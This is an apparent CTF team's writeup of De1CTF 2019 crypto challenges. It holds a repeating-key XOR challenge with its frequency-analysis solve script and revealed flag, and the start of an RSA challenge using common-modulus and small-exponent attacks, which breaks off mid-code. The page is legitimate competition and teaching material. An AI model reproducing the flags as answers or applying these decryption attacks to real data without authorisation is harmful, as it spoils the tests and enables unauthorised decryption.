<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="De1ta-Team">
    

    <!--Author-->
    
        <meta name="author" content="chybeta、pr0ph3t">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="De1ctf 2019 Writeup"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="De1ta"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>De1ctf 2019 Writeup - De1ta</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><img src="https://avatars0.githubusercontent.com/u/39492862"></a>
        
        <!-- hacked by chybeta -->
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2019/08/08/de1ctf2019 Writeup/">
                De1ctf 2019 Writeup
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-08-08</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h1 id="De1ta-Team"><a href="#De1ta-Team" class="headerlink" title=" De1ta-Team"></a> <strong>De1ta-Team</strong></h1><a id="more"></a>
<blockquote>
<p>Team：De1ta</p>
</blockquote>
<h1 id="source-exp-wp"><a href="#source-exp-wp" class="headerlink" title="source + exp + wp"></a>source + exp + wp</h1><p><a href="https://github.com/De1ta-team/De1CTF2019" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2019</a></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Xorz"><a href="#Xorz" class="headerlink" title="Xorz"></a>Xorz</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> flag,plain</span><br><span class="line"></span><br><span class="line">key=flag.strip(<span class="string">"de1ctf&#123;"</span>).strip(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(key)&lt;<span class="number">38</span>)	</span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line">cipher = <span class="string">''</span>.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si)))[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="keyword">print</span> cipher</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span></span><br></pre></td></tr></table></figure>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> cycle</span><br><span class="line">c=<span class="string">"49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipher</span><span class="params">(c)</span>:</span></span><br><span class="line">    codeintlist = []</span><br><span class="line">    codeintlist.extend(</span><br><span class="line">        (map(<span class="keyword">lambda</span> i: int(c[i:i + <span class="number">2</span>], <span class="number">16</span>), range(<span class="number">0</span>, len(c), <span class="number">2</span>))))</span><br><span class="line">    salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line">    si=cycle(salt)</span><br><span class="line">    newcodeintlist = [ci ^ ord(next(si)) <span class="keyword">for</span> ci <span class="keyword">in</span> codeintlist]</span><br><span class="line">    <span class="keyword">return</span> newcodeintlist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKeyPool</span><span class="params">(cipher, stepSet, plainSet, keySet)</span>:</span></span><br><span class="line">    <span class="string">''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33]</span></span><br><span class="line"><span class="string">        返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。</span></span><br><span class="line"><span class="string">            形如&#123;</span></span><br><span class="line"><span class="string">                    1:[[0x11]],</span></span><br><span class="line"><span class="string">                    3:[</span></span><br><span class="line"><span class="string">                        [0x11,0x33,0x46],</span></span><br><span class="line"><span class="string">                        [0x22,0x58],</span></span><br><span class="line"><span class="string">                        [0x33]</span></span><br><span class="line"><span class="string">                       ]</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    keyPool = dict()</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> stepSet:</span><br><span class="line">        maybe = [<span class="keyword">None</span>] * step</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> xrange(step):</span><br><span class="line">            maybe[pos] = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> keySet:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> cipher[pos::step]:</span><br><span class="line">                    <span class="keyword">if</span> c ^ k <span class="keyword">not</span> <span class="keyword">in</span> plainSet:</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    maybe[pos].append(k)</span><br><span class="line">        <span class="keyword">for</span> posPool <span class="keyword">in</span> maybe:</span><br><span class="line">            <span class="keyword">if</span> len(posPool) == <span class="number">0</span>:</span><br><span class="line">                maybe = []</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(maybe) != <span class="number">0</span>:</span><br><span class="line">            keyPool[step] = maybe</span><br><span class="line">    <span class="keyword">return</span> keyPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calCorrelation</span><span class="params">(cpool)</span>:</span></span><br><span class="line">    <span class="string">'''传入字典，形如&#123;'e':2,'p':3&#125;</span></span><br><span class="line"><span class="string">        返回可能性，0~1,值越大可能性越大</span></span><br><span class="line"><span class="string">        (correlation between the decrypted column letter frequencies and</span></span><br><span class="line"><span class="string">        the relative letter frequencies for normal English text)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    frequencies = &#123;<span class="string">"e"</span>: <span class="number">0.12702</span>, <span class="string">"t"</span>: <span class="number">0.09056</span>, <span class="string">"a"</span>: <span class="number">0.08167</span>, <span class="string">"o"</span>: <span class="number">0.07507</span>, <span class="string">"i"</span>: <span class="number">0.06966</span>,</span><br><span class="line">                   <span class="string">"n"</span>: <span class="number">0.06749</span>, <span class="string">"s"</span>: <span class="number">0.06327</span>, <span class="string">"h"</span>: <span class="number">0.06094</span>, <span class="string">"r"</span>: <span class="number">0.05987</span>, <span class="string">"d"</span>: <span class="number">0.04253</span>,</span><br><span class="line">                   <span class="string">"l"</span>: <span class="number">0.04025</span>, <span class="string">"c"</span>: <span class="number">0.02782</span>, <span class="string">"u"</span>: <span class="number">0.02758</span>, <span class="string">"m"</span>: <span class="number">0.02406</span>, <span class="string">"w"</span>: <span class="number">0.02360</span>,</span><br><span class="line">                   <span class="string">"f"</span>: <span class="number">0.02228</span>, <span class="string">"g"</span>: <span class="number">0.02015</span>, <span class="string">"y"</span>: <span class="number">0.01974</span>, <span class="string">"p"</span>: <span class="number">0.01929</span>, <span class="string">"b"</span>: <span class="number">0.01492</span>,</span><br><span class="line">                   <span class="string">"v"</span>: <span class="number">0.00978</span>, <span class="string">"k"</span>: <span class="number">0.00772</span>, <span class="string">"j"</span>: <span class="number">0.00153</span>, <span class="string">"x"</span>: <span class="number">0.00150</span>, <span class="string">"q"</span>: <span class="number">0.00095</span>,</span><br><span class="line">                   <span class="string">"z"</span>: <span class="number">0.00074</span>&#125;</span><br><span class="line">    relative = <span class="number">0.0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    fpool = <span class="string">'etaoinshrdlcumwfgypbvkjxqz'</span></span><br><span class="line">    total = sum(cpool.values())  <span class="comment"># 总和应包括字母和其他可见字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cpool.keys():</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> fpool:</span><br><span class="line">            relative += frequencies[i] * cpool[i] / total</span><br><span class="line">    <span class="keyword">return</span> relative</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyseFrequency</span><span class="params">(cfreq)</span>:</span></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> posFreq <span class="keyword">in</span> cfreq:</span><br><span class="line">        mostRelative = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> keyChr <span class="keyword">in</span> posFreq.keys():</span><br><span class="line">            r = calCorrelation(posFreq[keyChr])</span><br><span class="line">            <span class="keyword">if</span> r &gt; mostRelative:</span><br><span class="line">                mostRelative = r</span><br><span class="line">                keychar = keyChr</span><br><span class="line">        key.append(keychar)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFrequency</span><span class="params">(cipher, keyPoolList)</span>:</span></span><br><span class="line">    <span class="string">''' 传入的密文作为数字列表处理</span></span><br><span class="line"><span class="string">        传入密钥的字符集应为列表，依次包含各字节字符集。</span></span><br><span class="line"><span class="string">            形如[[0x11,0x12],[0x22]]</span></span><br><span class="line"><span class="string">        返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频</span></span><br><span class="line"><span class="string">            形如[&#123;</span></span><br><span class="line"><span class="string">                    0x11:&#123;'a':2,'b':3&#125;,</span></span><br><span class="line"><span class="string">                    0x12:&#123;'e':6&#125;</span></span><br><span class="line"><span class="string">                 &#125;,</span></span><br><span class="line"><span class="string">                 &#123;</span></span><br><span class="line"><span class="string">                    0x22:&#123;'g':1&#125;</span></span><br><span class="line"><span class="string">                 &#125;]</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    freqList = []</span><br><span class="line">    keyLen = len(keyPoolList)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(keyLen):</span><br><span class="line">        posFreq = dict()</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> keyPoolList[i]:</span><br><span class="line">            posFreq[k] = dict()</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> cipher[i::keyLen]:</span><br><span class="line">                p = chr(k ^ c)</span><br><span class="line">                posFreq[k][p] = posFreq[k][p] + <span class="number">1</span> <span class="keyword">if</span> p <span class="keyword">in</span> posFreq[k] <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">        freqList.append(posFreq)</span><br><span class="line">    <span class="keyword">return</span> freqList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vigenereDecrypt</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    plain = <span class="string">''</span></span><br><span class="line">    cur = <span class="number">0</span></span><br><span class="line">    ll = len(key)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">        plain += chr(c ^ key[cur])</span><br><span class="line">        cur = (cur + <span class="number">1</span>) % ll</span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ps = []</span><br><span class="line">    ks = []</span><br><span class="line">    ss = []</span><br><span class="line">    ps.extend(xrange(<span class="number">32</span>, <span class="number">127</span>))</span><br><span class="line">    ks.extend(xrange(<span class="number">0xff</span> + <span class="number">1</span>))</span><br><span class="line">    ss.extend(xrange(<span class="number">38</span>))</span><br><span class="line">    cipher = getCipher(c)</span><br><span class="line"></span><br><span class="line">    keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keyPool:</span><br><span class="line">        freq = getFrequency(cipher, keyPool[i])</span><br><span class="line">        key = analyseFrequency(freq)</span><br><span class="line">        plain = vigenereDecrypt(cipher, key)</span><br><span class="line">        <span class="keyword">print</span> plain,<span class="string">"\n"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span>.join(map(chr,key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># output: Wvlc0m3tOjo1nu55un1ojOt3q0cl3W 修正后得到flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data文件实际内容：</span></span><br><span class="line"><span class="comment"># flag="de1ctf&#123;W3lc0m3tOjo1nu55un1ojOt3m0cl3W&#125;"</span></span><br><span class="line"><span class="comment"># plain="In faith I do not love thee with mine eyes,For they in thee a thousand errors note;But `tis my heart that loves what they despise,Who in despite of view is pleased to dote.Nor are mine ears with thy tongue`s tune delighted;Nor tender feeling to base touches prone,Nor taste, nor smell, desire to be invitedTo any sensual feast with thee alone.But my five wits, nor my five senses canDissuade one foolish heart from serving thee,Who leaves unswayed the likeness of a man,Thy proud heart`s slave and vassal wretch to be.Only my plague thus far I count my gain,That she that makes me sin awards me pain."</span></span><br></pre></td></tr></table></figure>
<h2 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby RSA"></a>Baby RSA</h2><p>本题主要考察RSA的基础知识和常见攻击方式，涉及共模攻击、小指数攻击等。首先通过共模攻击等到p，再通过小指数攻击得到e1，e2，然后使用yafu分解大数得到q1且可解出没有任何用处的hint。然后是以flag为明文的加密，这里的加密不满足e和φ互素，因此虽然知道p，q，但无法直接解密，需要稍做操作。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> e1,e2,p,q1p,q1q,hint,flag</span><br><span class="line"></span><br><span class="line">n =  [<span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L</span>, <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L</span>, <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L</span>, <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L</span>]</span><br><span class="line">c =  [<span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L</span>, <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L</span>, <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L</span>, <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L</span>]</span><br><span class="line">f=<span class="keyword">lambda</span> m,e,n,c:pow(m,e,n)==c</span><br><span class="line"><span class="keyword">assert</span>(sum(map(f,[p]*<span class="number">4</span>,[<span class="number">4</span>]*<span class="number">4</span>,n,c))==<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">ee1 = <span class="number">42</span></span><br><span class="line">ee2 = <span class="number">3</span></span><br><span class="line">ce1 =  <span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">ce2 =  <span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp =  <span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">n  =  <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line"><span class="keyword">assert</span>(pow(e1,ee1,n)==ce1)</span><br><span class="line"><span class="keyword">assert</span>(pow(e2+tmp,ee2,n)==ce2)</span><br><span class="line"></span><br><span class="line">e = <span class="number">46531</span></span><br><span class="line">n = <span class="number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span></span><br><span class="line">c = <span class="number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span></span><br><span class="line">hint=int(binascii.hexlify(hint),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">assert</span>(q1p*q1q==n)</span><br><span class="line"><span class="keyword">assert</span>(q1p&lt;q1q)</span><br><span class="line"><span class="keyword">assert</span>(c==pow(hint,e,n))</span><br><span class="line"></span><br><span class="line">flag=int(binascii.hexlify(flag),<span 